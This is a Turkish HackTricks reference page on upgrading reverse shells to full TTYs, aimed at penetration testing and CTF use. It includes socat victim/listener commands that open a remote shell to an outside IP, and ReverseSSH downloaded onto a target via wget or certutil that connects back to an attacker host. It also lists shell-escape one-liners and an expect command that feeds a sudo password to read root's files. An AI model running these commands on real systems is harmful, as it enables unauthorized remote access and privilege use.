# Tam TTY'ler

{{#include ../../banners/hacktricks-training.md}}

## Tam TTY

`/etc/shells`, geçerli login-shell path'lerini listeler ve bazı programlar tarafından kullanılır; PTY ayırmak için evrensel bir ön koşul değildir.<sup>[[3]](#references)[[4]](#references)</sup> `pkexec` gibi bir program `SHELL` değişkenini `The value for the SHELL variable was not found in the /etc/shells file` mesajıyla reddediyorsa, shell path'inin tamamının (örneğin, `/bin/bash`) `/etc/shells` içinde bulunduğundan emin olun.<sup>[[10]](#references)</sup> Aşağıdaki `CTRL+Z`/`fg` kurtarma dizisi Bash job control kullanır; mevcut shell Bash değilse bu diziyi kullanmadan önce Bash başlatın.<sup>[[7]](#references)</sup>

#### Python

Python'un `pty.spawn` işlevi, bir programı mevcut process'in standard input, output ve error stream'lerine bağlı olarak başlatır; bu da bu session'da Bash'e bir pseudo-terminal sağlar.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`** komutunu çalıştırarak **satır** ve **sütun** **sayısını** alabilirsiniz; `-a` mevcut tüm terminal ayarlarını yazdırır. Komutun çıktısı terminale özgüdür; bu nedenle mevcut session tarafından bildirilen değerleri kullanın.<sup>[[11]](#references)</sup>

#### script

`script` utility bir terminal session'ını kaydeder; burada `/dev/null` typescript'i yok sayar, `-q` başlatma ve tamamlanma mesajlarını gizler, `-c` ise varsayılan shell yerine Bash'i çalıştırır.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Her iki PTY-spawn yönteminden sonra Netcat oturumunu askıya alın ve yerel raw mode ile geri yükleyin, ardından uzak terminal ortamını ve boyutlarını ayarlayın:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Dinleyici, mevcut terminali local echo devre dışı bırakılmış raw mode ile kullanır ve 4444 portunda TCP bağlantılarını kabul eder. Victim komutu bir pty tahsis eder, stderr akışını birleştirir, bir session oluşturur, SIGINT'i iletir ve sane terminal settings uygular; child process'in controlling terminal'e ihtiyacı varsa `ctty` ekleyin.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell Spawn Etme**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (eski sürümlerde `--interactive` ile): `!sh`

Nmap escape'i sürüme özeldir: Nmap sonraki sürümlerde `--interactive` modunu kaldırmıştır; bu nedenle `!sh` yalnızca eski sürümler için geçerlidir.<sup>[[13]](#references)</sup>

## ReverseSSH

**Interactive shell erişimi**, ayrıca **file transfer** ve **port forwarding** için kullanışlı bir yöntem, statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)'i hedef sisteme bırakmaktır.<sup>[[1]](#references)</sup>

Aşağıda, projenin yayımlanmış UPX-compressed binary dosyasıyla `x86` için bir örnek verilmiştir. Diğer mimariler veya release artifact'leri için [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) sayfasını yönlendirme olarak kullanın.<sup>[[1]](#references)</sup>

1. Gelen SSH bağlantısını yakalayacak şekilde local host'u hazırlayın. Listener mode'da `-l` listener'ı etkinleştirir ve `-p 4444`, hedefin bağlantısını kabul edeceği portu seçer.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux hedefi. Aynı `upx_reverse-sshx86` artifact'ını `/dev/shm/reverse-ssh` konumuna aktarın ve çalıştırılabilir hale getirin. Hedefteki `-p 4444`, yukarıdaki dinleyici portunu seçer; `kali@10.0.0.2` ise ana sisteme bağlantı kurmak için kullanılan hesap ve host'u belirtir.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows hedefi. Tam etkileşimli PowerShell için Windows 10 build 17763 gerekir; [proje README'sine](https://github.com/Fahrj/reverse-ssh#features) bakın.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows örneği `certutil` komutunu `-f -urlcache` seçenekleriyle kullanır; Microsoft, `-f` seçeneğini URL getirmeyi zorlamak olarak belgeler ve kullanılabilir parametrelerin sürüme göre değiştiğini belirtir. Bu biçim kullanılamıyorsa `certutil -?` komutunu kontrol edin.<sup>[[12]](#references)</sup>

- Reverse connection başarılı olduktan sonra ReverseSSH'nin reverse-mode listener'ı varsayılan olarak `8888` portuna (veya `-b` ile sağlanan değere) bağlanır ve gelen bağlantılar varsayılan `letmeinbrudipls` parolasıyla herhangi bir username'i kabul eder. Remote shell, `reverse-ssh(.exe)` dosyasını çalıştıran account'un yetkileriyle çalışır.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope), Unix benzeri reverse shell'leri otomatik olarak PTY'ye yükseltir, Unix benzeri terminalleri yeniden boyutlandırır ve shell etkileşimlerini günlüğe kaydeder; Windows shell'leri için readline sağlar, ancak gerçek zamanlı terminal yeniden boyutlandırma sunmaz.<sup>[[2]](#references)</sup>

![Penelope reverse-shell handler arayüzü](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Varsayılan olarak `0.0.0.0:4444` adresini dinlemek için `penelope` komutunu çalıştırın; gelen Unix benzeri shell'ler otomatik olarak yükseltilebilir ve günlüğe kaydedilebilir.<sup>[[2]](#references)</sup>

![Penelope'in gelen bir shell'i yönetmesi ve yükseltmesi](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## TTY Yok

Herhangi bir nedenle tam bir TTY elde edemezseniz, **yine de kullanıcı girdisi bekleyen programlarla etkileşim kurabilirsiniz**. Aşağıdaki örnekte Expect, `sudo`'yu başlatır, parola istemini bekler, parolayı gönderir ve `interact` ile kontrolü geri verir; `sudo -S` parolasını standart girdiden okur. Bunu yalnızca yetkili bir lab ortamında kullanın ve gerçek kimlik bilgilerini shell geçmişine veya kaynak dosyalarına yerleştirmekten kaçının.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTF'ler ve benzeri amaçlar için reverse shell işlevine sahip statik olarak bağlanmış ssh sunucusu](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Kullanımı kolaylaştırmak için bazı işlemleri otomatikleştiren shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python belgeleri](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — İş Denetimi](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Değişiklik Günlüğü](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
